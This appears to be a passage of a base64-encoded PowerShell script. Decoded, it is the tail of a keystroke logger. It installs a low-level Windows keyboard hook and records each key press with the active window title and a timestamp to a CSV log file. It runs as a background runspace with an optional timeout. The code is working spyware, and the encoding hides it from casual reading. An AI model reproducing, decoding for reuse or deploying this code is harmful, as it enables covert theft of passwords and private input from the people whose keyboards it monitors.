RLZXkgPSAnPFNoaWZ0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TENvbnRyb2xLZXkgeyAkS2V5ID0gJzxDdHJsPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UkNvbnRyb2xLZXkgeyAkS2V5ID0gJzxDdHJsPicgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCgogICAgICAgICAgICAgICAgJFRpdGxlID0gTmV3LU9iamVjdCBUZXh0LlN0cmluZ2J1aWxkZXIgMjU2CiAgICAgICAgICAgICAgICAkR2V0V2luZG93VGV4dC5JbnZva2UoJGhXaW5kb3csICRUaXRsZSwgJFRpdGxlLkNhcGFjaXR5KQoKCiAgICAgICAgICAgICAgICAkUHJvcHMgPSBAewogICAgICAgICAgICAgICAgICAgIEtleSA9ICRLZXkKICAgICAgICAgICAgICAgICAgICBUaW1lID0gW0RhdGVUaW1lXTo6Tm93CiAgICAgICAgICAgICAgICAgICAgV2luZG93ID0gJFRpdGxlLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkb2JqID0gTmV3LU9iamVjdCBwc29iamVjdCAtUHJvcGVydHkgJFByb3BzCiAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICRDU1ZFbnRyeSA9ICgkb2JqIHwgU2VsZWN0LU9iamVjdCBLZXksV2luZG93LFRpbWUgfCBDb252ZXJ0VG8tQ3N2IC1Ob1R5cGVJbmZvcm1hdGlvbilbMV0KCgogICAgICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRMb2dQYXRoIC1BcHBlbmQgLUlucHV0T2JqZWN0ICRDU1ZFbnRyeSAtRW5jb2RpbmcgdW5pY29kZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkQ2FsbE5leHRIb29rRXguSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ29kZSwgJHdQYXJhbSwgJGxQYXJhbSkKICAgICAgICB9CgoKICAgICAgICAkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENhbGxiYWNrID0gJENhbGxiYWNrU2NyaXB0IC1hcyAkRGVsZWdhdGUKICAgIAoKICAgICAgICAkUG9zaE1vZHVsZSA9IChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuTWFpbk1vZHVsZS5Nb2R1bGVOYW1lCiAgICAgICAgJE1vZHVsZUhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRQb3NoTW9kdWxlKQoKCiAgICAgICAgJEhvb2sgPSAkU2V0V2luZG93c0hvb2tFeC5JbnZva2UoMHhELCAkQ2FsbGJhY2ssICRNb2R1bGVIYW5kbGUsIDApCiAgICAKICAgICAgICAkU3RvcHdhdGNoID0gW0RpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKCiAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnMuVGltZW91dCAtYW5kICgkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxNaW51dGVzIC1ndCAkVGltZW91dCkpIHsgYnJlYWsgfQogICAgICAgICAgICAkUGVla01lc3NhZ2UuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybywgMHgxMDAsIDB4MTA5LCAwKQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwCiAgICAgICAgfQoKICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgCgogICAgICAgICRVbmhvb2tXaW5kb3dzSG9va0V4Lkludm9rZSgkSG9vaykKICAgIH0KCgogICAgJFBvd2VyU2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICBbdm9pZF0kUG93ZXJTaGVsbC5BZGRTY3JpcHQoJFNjcmlwdCkKICAgIFt2b2lkXSRQb3dlclNoZWxsLkFkZEFyZ3VtZW50KCRMb2dQYXRoKQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5UaW1lb3V0KSB7IFt2b2lkXSRQb3dlclNoZWxsLkFkZEFyZ3VtZW50KCRUaW1lb3V0KSB9CgoKICAgIFt2b2lkXSRQb3dlclNoZWxsLkJlZ2luSW52b2tlKCkKCiAgICBpZiAoJFBhc3NUaHJ1LklzUHJlc2VudCkgeyByZXR1cm4gJFBvd2VyU2hlbGwgfQp9Cg==
